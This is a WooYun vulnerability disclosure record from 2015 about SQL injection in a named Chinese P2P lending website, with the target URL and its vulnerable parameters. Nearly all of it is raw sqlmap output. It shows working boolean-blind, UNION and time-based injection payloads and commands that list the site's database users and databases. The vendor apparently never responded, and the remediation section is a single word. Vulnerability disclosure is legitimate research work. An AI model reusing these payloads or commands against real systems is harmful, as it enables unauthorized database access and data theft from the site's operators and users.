{"id": 77731, "wybug_id": "wooyun-2015-0161904", "wybug_title": "P2P金融某借贷某处高危SQL注入漏洞", "wybug_corp": "商康金融", "wybug_author": "奶嘴", "wybug_date": "2015-12-17 10:37", "wybug_open_date": "2016-01-28 17:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-01-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rtrt 详细说明：  http://www.3kloan.com/login.do?method=xdcp&yid=18&cid=1 此处存在高危注入整个数据库读取单引号服务器报错   漏洞证明：  y)? [y/N] ysqlmap identified the following injection points with a total of 242 HTTP(s) requests:---Place: GETParameter: yid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: method=xdcp&yid=18' AND 6749=6749 AND 'kTYm'='kTYm&cid=1    Type: UNION query    Title: MySQL UNION query (NULL) - 54 columns    Payload: method=xdcp&yid=18' LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a7a796f3a,0x437a5a725a4e536c5255,0x3a7a756e3a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#&cid=1    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: method=xdcp&yid=18' AND SLEEP(5) AND 'Tjhw'='Tjhw&cid=1Place: GETParameter: cid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: method=xdcp&yid=18&cid=1' AND 6453=6453 AND 'xPNt'='xPNt    Type: UNION query    Title: MySQL UNION query (NULL) - 54 columns    Payload: method=xdcp&yid=18&cid=1' LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a7a796f3a,0x524a65695946486b6776,0x3a7a756e3a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: method=xdcp&yid=18&cid=1' AND SLEEP(5) AND 'KLtJ'='KLtJ---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: yid, type: Single quoted string (default)[1] place: GET, parameter: cid, type: Single quoted string[q] Quit> 1[19:02:31] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0.11[19:02:31] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 23 times, 404 (Not Found) - 178 times[19:02:31] [INFO] fetched data logged to text files under 'C:\\Users\\dell-pc\\AppData\\Local\\Temp\\HZ$D68~1.257\\HZ$D68~1.257\\SQLMAP~1\\Bin\\output\\www.3kloan.com'[*] shutting down at 19:02:31[root@Hacker~]# Sqlmap -u \"http://www.3kloan.com/login.do?method=xdcp&yid=18&cid=1\" --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 19:02:41[19:02:42] [INFO] resuming back-end DBMS 'mysql'[19:02:42] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: yid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: method=xdcp&yid=18' AND 6749=6749 AND 'kTYm'='kTYm&cid=1    Type: UNION query    Title: MySQL UNION query (NULL) - 54 columns    Payload: method=xdcp&yid=18' LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a7a796f3a,0x437a5a725a4e536c5255,0x3a7a756e3a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#&cid=1    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: method=xdcp&yid=18' AND SLEEP(5) AND 'Tjhw'='Tjhw&cid=1Place: GETParameter: cid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: method=xdcp&yid=18&cid=1' AND 6453=6453 AND 'xPNt'='xPNt    Type: UNION query    Title: MySQL UNION query (NULL) - 54 columns    Payload: method=xdcp&yid=18&cid=1' LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a7a796f3a,0x524a65695946486b6776,0x3a7a756e3a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: method=xdcp&yid=18&cid=1' AND SLEEP(5) AND 'KLtJ'='KLtJ---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: yid, type: Single quoted string (default)[1] place: GET, parameter: cid, type: Single quoted string[q] Quit> 2[19:02:48] [CRITICAL] invalid choice[*] shutting down at 19:02:48[root@Hacker~]# Sqlmap -u \"http://www.3kloan.com/login.do?method=xdcp&yid=18&cid=1\" --users    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 19:02:55[19:02:56] [INFO] resuming back-end DBMS 'mysql'[19:02:56] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: yid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: method=xdcp&yid=18' AND 6749=6749 AND 'kTYm'='kTYm&cid=1    Type: UNION query    Title: MySQL UNION query (NULL) - 54 columns    Payload: method=xdcp&yid=18' LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a7a796f3a,0x437a5a725a4e536c5255,0x3a7a756e3a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#&cid=1    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: method=xdcp&yid=18' AND SLEEP(5) AND 'Tjhw'='Tjhw&cid=1Place: GETParameter: cid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: method=xdcp&yid=18&cid=1' AND 6453=6453 AND 'xPNt'='xPNt    Type: UNION query    Title: MySQL UNION query (NULL) - 54 columns    Payload: method=xdcp&yid=18&cid=1' LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a7a796f3a,0x524a65695946486b6776,0x3a7a756e3a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: method=xdcp&yid=18&cid=1' AND SLEEP(5) AND 'KLtJ'='KLtJ---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: yid, type: Single quoted string (default)[1] place: GET, parameter: cid, type: Single quoted string[q] Quit> 1[19:02:58] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0.11[19:02:58] [INFO] fetching database users[19:02:59] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[19:03:02] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries[19:03:02] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' and/or switch '--hex'[19:03:02] [INFO] fetching number of database users[19:03:02] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[19:03:02] [INFO] retrieved: 3[19:03:04] [INFO] retrieved: 'root'@'localhost'[19:04:04] [INFO] retrieved: 'root'@'production'[19:04:39] [INFO] retrieved: 'root'@'127.0.0.1'database management system users [3]:[*] 'root'@'127.0.0.1'[*] 'root'@'localhost'[*] 'root'@'production'[19:05:12] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 8 times[19:05:12] [INFO] fetched data logged to text files under 'C:\\Users\\dell-pc\\AppData\\Local\\Temp\\HZ$D68~1.257\\HZ$D68~1.257\\SQLMAP~1\\Bin\\output\\www.3kloan.com'[*] shutting down at 19:05:12[root@Hacker~]# Sqlmap -u \"http://www.3kloan.com/login.do?method=xdcp&yid=18&cid=1\" --tables    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 19:05:33[19:05:33] [INFO] resuming back-end DBMS 'mysql'[19:05:33] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: yid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: method=xdcp&yid=18' AND 6749=6749 AND 'kTYm'='kTYm&cid=1    Type: UNION query    Title: MySQL UNION query (NULL) - 54 columns    Payload: method=xdcp&yid=18' LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a7a796f3a,0x437a5a725a4e536c5255,0x3a7a756e3a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#&cid=1    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: method=xdcp&yid=18' AND SLEEP(5) AND 'Tjhw'='Tjhw&cid=1Place: GETParameter: cid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: method=xdcp&yid=18&cid=1' AND 6453=6453 AND 'xPNt'='xPNt    Type: UNION query    Title: MySQL UNION query (NULL) - 54 columns    Payload: method=xdcp&yid=18&cid=1' LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a7a796f3a,0x524a65695946486b6776,0x3a7a756e3a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: method=xdcp&yid=18&cid=1' AND SLEEP(5) AND 'KLtJ'='KLtJ---there were multiple injection points, please select the one to use for following injections:[0] place: GET, parameter: yid, type: Single quoted string (default)[1] place: GET, parameter: cid, type: Single quoted string[q] Quit> 1[19:05:35] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0.11[19:05:35] [INFO] fetching database names[19:05:36] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[19:05:38] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries[19:05:39] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' and/or switch '--hex'[19:05:39] [INFO] fetching number of databases[19:05:39] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[19:05:39] [INFO] retrieved: 7[19:05:41] [INFO] retrieved: information_schema[19:06:14] [INFO] retrieved: 3enong[19:06:26] [INFO] retrieved:   修复方案：  过滤请问有礼物啊？   版权声明：转载请注明来源 奶嘴@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}